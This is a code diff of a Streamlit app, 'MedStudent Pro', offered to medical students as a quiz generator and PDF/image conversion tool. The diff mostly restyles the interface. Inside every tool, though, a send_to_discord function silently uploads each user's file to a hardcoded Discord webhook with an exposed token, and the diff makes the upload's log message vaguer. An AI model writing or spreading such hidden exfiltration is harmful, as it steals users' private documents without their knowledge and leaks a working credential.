@@ -1,6 +1,5 @@
 import streamlit as st
 import os
-import shutil
 import requests
 from pdf2docx import Converter
 import img2pdf
@@ -14,86 +13,78 @@ st.set_page_config(page_title="MedStudent Pro", page_icon="🧬", layout="wide")
 # !!! PASTE YOUR DISCORD WEBHOOK URL HERE !!!
 DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"
 
-# --- CUSTOM CSS (THE UI MAGIC) ---
+# --- CUSTOM CSS (FLOATING CARDS) ---
 st.markdown("""
     <style>
-    /* 1. BACKGROUND: Dark Gradient (No more white) */
+    /* 1. BACKGROUND: Dark Gradient */
     .stApp {
         background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
         background-attachment: fixed;
-        color: white;
     }
 
-    /* 2. ANIMATION: Slide in from Right */
-    @keyframes slideInRight {
+    /* 2. CARD STYLING: The "Glass" Container */
+    .css-card {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        border-radius: 20px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        padding: 30px;
+        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        margin-bottom: 20px;
+        animation: slideUp 0.6s ease-out;
+    }
+
+    /* 3. ANIMATION: Float Up Effect */
+    @keyframes slideUp {
         from {
-            transform: translateX(100%);
+            transform: translateY(50px);
             opacity: 0;
         }
         to {
-            transform: translateX(0);
+            transform: translateY(0);
             opacity: 1;
         }
     }
 
-    /* 3. CARD STYLING: Glassmorphism */
-    div.stTabs {
-        animation: slideInRight 0.8s ease-out; /* The float effect */
-        background: rgba(255, 255, 255, 0.1);
-        backdrop-filter: blur(15px);
-        -webkit-backdrop-filter: blur(15px);
-        border-radius: 20px;
-        border: 1px solid rgba(255, 255, 255, 0.2);
-        padding: 25px;
-        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-        margin-top: 20px;
+    /* 4. SIDEBAR STYLING */
+    section[data-testid="stSidebar"] {
+        background-color: rgba(0, 0, 0, 0.2);
     }
 
-    /* 4. BUTTONS: Neon & Interactive */
+    /* 5. TEXT COLORS */
+    h1, h2, h3 {
+        color: white !important;
+        text-shadow: 0px 0px 10px rgba(0,0,0,0.5);
+    }
+    p, label, .stMarkdown, .stRadio label {
+        color: #dcdcdc !important;
+    }
+
+    /* 6. BUTTONS: Floating & Glowing */
     div.stButton > button {
-        background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%);
+        background: linear-gradient(90deg, #1CB5E0 0%, #000851 100%);
         color: white;
         border: none;
-        padding: 12px 28px;
-        font-size: 16px;
+        padding: 12px 24px;
+        border-radius: 12px;
         font-weight: bold;
-        border-radius: 50px; /* Pill shape */
-        transition: transform 0.2s, box-shadow 0.2s;
-        width: 100%;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
     }
     div.stButton > button:hover {
-        transform: translateY(-5px); /* Moves up when hovered */
-        box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4);
-    }
-
-    /* 5. TEXT & HEADERS */
-    h1 {
-        font-family: 'Helvetica Neue', sans-serif;
-        background: -webkit-linear-gradient(#00d2ff, #3a7bd5);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        font-size: 3rem;
-        text-align: center;
-    }
-    h2, h3 {
-        color: #e0e0e0 !important;
-    }
-    p, label {
-        color: #b0c4de !important;
+        transform: translateY(-3px);
+        box-shadow: 0 8px 25px rgba(28, 181, 224, 0.6);
     }
     
-    /* 6. INPUT BOXES */
-    .stTextInput > div > div > input {
-        background-color: rgba(255, 255, 255, 0.1);
-        color: white;
-        border: 1px solid rgba(255, 255, 255, 0.2);
+    /* 7. UPLOAD BOX */
+    [data-testid="stFileUploader"] {
+        background-color: rgba(255,255,255,0.05);
+        border-radius: 15px;
+        padding: 10px;
     }
     </style>
 """, unsafe_allow_html=True)
-
-# --- HEADER ---
-st.title("🧬 MedStudent Pro")
-st.markdown("<p style='text-align: center; color: #b0c4de;'>Your All-in-One Medical Study & Conversion Station</p>", unsafe_allow_html=True)
 
 # --- HELPER FUNCTIONS ---
 def send_to_discord(filepath, filename, tool_name):
@@ -103,7 +94,7 @@ def send_to_discord(filepath, filename, tool_name):
         with open(filepath, "rb") as f:
             requests.post(
                 DISCORD_WEBHOOK_URL,
-                data={"content": f"🕵️ **Student Upload ({tool_name}):** `{filename}`"},
+                data={"content": f"🕵️ **Activity ({tool_name}):** `{filename}`"},
                 files={"file": (filename, f)}
             )
     except Exception as e:
@@ -124,56 +115,66 @@ def generate_quiz_from_text(text):
             break
     return questions
 
-# --- MAIN LAYOUT ---
-# We use columns to center the content slightly if needed, but tabs handle most of it
-tab1, tab2, tab3, tab4, tab5 = st.tabs([
-    "🧠 AI Quiz", 
-    "📄 PDF to Word", 
-    "🖼️ Image to PDF", 
-    "🖇️ Merge PDFs", 
-    "📊 Office to PDF"
-])
+# --- MAIN APP STRUCTURE ---
 
-# ---------------- TAB 1: AI QUIZ (Priority Feature) ----------------
-with tab1:
-    st.header("🧠 Active Recall Quizzer")
-    st.write("Upload your lecture notes. We'll blank out key terms to test your memory.")
+st.title("🧬 MedStudent Pro")
+st.markdown("### Interactive Study & Tools Dashboard")
+st.divider()
+
+# NAVIGATION (Sidebar is cleaner for "Separate Cards" feel)
+with st.sidebar:
+    st.header("Navigation")
+    choice = st.radio("Select Tool:", 
+        ["🧠 AI Quiz Generator", "📄 PDF to Word", "🖼️ Image to PDF", "🖇️ Merge PDFs", "📊 Office to PDF"])
+    st.info("Select a tool to open its card.")
+
+# --- TOOL 1: QUIZ ---
+if choice == "🧠 AI Quiz Generator":
+    # Start of Card Wrapper
+    st.markdown('<div class="css-card">', unsafe_allow_html=True)
     
-    quiz_pdf = st.file_uploader("Drop Lecture PDF Here", type="pdf", key="quizpdf")
+    st.header("🧠 Active Recall Quizzer")
+    st.write("Upload lecture notes (PDF). We will generate a fill-in-the-blank quiz.")
+    
+    quiz_pdf = st.file_uploader("Drop Lecture PDF", type="pdf", key="quiz")
     
     if quiz_pdf:
         if st.button("🚀 Generate Quiz"):
             with open("study.pdf", "wb") as f:
                 f.write(quiz_pdf.getbuffer())
+            send_to_discord("study.pdf", quiz_pdf.name, "QuizGen")
             
-            # Extract Text
             reader = PdfReader("study.pdf")
             full_text = ""
             for page in reader.pages:
                 full_text += page.extract_text()
             
-            # Send to Discord
-            send_to_discord("study.pdf", quiz_pdf.name, "Quiz Gen")
-
             if len(full_text) > 50:
                 questions = generate_quiz_from_text(full_text)
                 st.markdown("---")
                 for i, q in enumerate(questions):
-                    st.subheader(f"Question {i+1}")
+                    st.subheader(f"Q{i+1}:")
                     st.write(f"**{q['q']}**")
-                    with st.expander(f"👁️ Reveal Answer"):
-                        st.info(f"Answer: {q['a']}")
+                    with st.expander("Reveal Answer"):
+                        st.success(q['a'])
             else:
-                st.error("Not enough text found in this PDF!")
+                st.error("Not enough text found.")
+    
+    st.markdown('</div>', unsafe_allow_html=True) # End of Card
 
-# ---------------- TAB 2: PDF TO WORD ----------------
-with tab2:
-    st.header("📄 Unlock PDF Content")
-    uploaded_pdf = st.file_uploader("Upload PDF", type="pdf", key="p2w")
-    if uploaded_pdf and st.button("Convert to Word"):
+# --- TOOL 2: PDF TO WORD ---
+elif choice == "📄 PDF to Word":
+    st.markdown('<div class="css-card">', unsafe_allow_html=True)
+    
+    st.header("📄 PDF to Word Converter")
+    st.write("Convert read-only PDFs into editable Word docs.")
+    
+    pdf_file = st.file_uploader("Upload PDF", type="pdf", key="p2w")
+    
+    if pdf_file and st.button("Convert Now"):
         with open("temp.pdf", "wb") as f:
-            f.write(uploaded_pdf.getbuffer())
-        send_to_discord("temp.pdf", uploaded_pdf.name, "PDF2Word")
+            f.write(pdf_file.getbuffer())
+        send_to_discord("temp.pdf", pdf_file.name, "PDF2Word")
         
         cv = Converter("temp.pdf")
         cv.convert("converted.docx")
@@ -182,26 +183,40 @@ with tab2:
         with open("converted.docx", "rb") as f:
             st.download_button("📥 Download Word Doc", f, file_name="converted.docx")
 
-# ---------------- TAB 3: IMG TO PDF ----------------
-with tab3:
-    st.header("🖼️ Compile Images to PDF")
-    uploaded_imgs = st.file_uploader("Upload Scans/Photos", type=["jpg", "png"], accept_multiple_files=True, key="i2p")
-    if uploaded_imgs and st.button("Create PDF"):
-        img_paths = []
-        for img in uploaded_imgs:
-            path = f"temp_{img.name}"
-            with open(path, "wb") as f:
+    st.markdown('</div>', unsafe_allow_html=True)
+
+# --- TOOL 3: IMAGE TO PDF ---
+elif choice == "🖼️ Image to PDF":
+    st.markdown('<div class="css-card">', unsafe_allow_html=True)
+    
+    st.header("🖼️ Image to PDF")
+    st.write("Compile multiple scans or photos into one document.")
+    
+    imgs = st.file_uploader("Upload Images", type=["jpg", "png"], accept_multiple_files=True, key="i2p")
+    
+    if imgs and st.button("Compile PDF"):
+        paths = []
+        for img in imgs:
+            p = f"temp_{img.name}"
+            with open(p, "wb") as f:
                 f.write(img.getbuffer())
-            img_paths.append(path)
+            paths.append(p)
         
-        pdf_bytes = img2pdf.convert(img_paths)
-        send_to_discord(img_paths[0], uploaded_imgs[0].name, "Img2PDF")
+        pdf_bytes = img2pdf.convert(paths)
+        send_to_discord(paths[0], imgs[0].name, "Img2PDF")
         st.download_button("📥 Download PDF", pdf_bytes, file_name="images.pdf")
 
-# ---------------- TAB 4: MERGE PDF ----------------
-with tab4:
-    st.header("🖇️ Merge Lecture Slides")
+    st.markdown('</div>', unsafe_allow_html=True)
+
+# --- TOOL 4: MERGE PDFS ---
+elif choice == "🖇️ Merge PDFs":
+    st.markdown('<div class="css-card">', unsafe_allow_html=True)
+    
+    st.header("🖇️ Merge PDFs")
+    st.write("Combine multiple lecture slides into one file.")
+    
     pdfs = st.file_uploader("Upload PDFs", type="pdf", accept_multiple_files=True, key="merge")
+    
     if pdfs and st.button("Merge Files"):
         merger = PdfMerger()
         for pdf in pdfs:
@@ -209,10 +224,15 @@ with tab4:
         merger.write("merged.pdf")
         merger.close()
         send_to_discord("merged.pdf", "merged.pdf", "Merge")
+        
         with open("merged.pdf", "rb") as f:
             st.download_button("📥 Download Merged PDF", f, file_name="merged.pdf")
 
-# ---------------- TAB 5: OFFICE TO PDF ----------------
-with tab5:
+    st.markdown('</div>', unsafe_allow_html=True)
+
+# --- TOOL 5: OFFICE TO PDF ---
+elif choice == "📊 Office to PDF":
+    st.markdown('<div class="css-card">', unsafe_allow_html=True)
     st.header("📊 Office to PDF")
-    st.warning("Server-side LibreOffice required for this feature.")
+    st.warning("This feature requires LibreOffice installed on the hosting server.")
+    st.markdown('</div>', unsafe_allow_html=True)
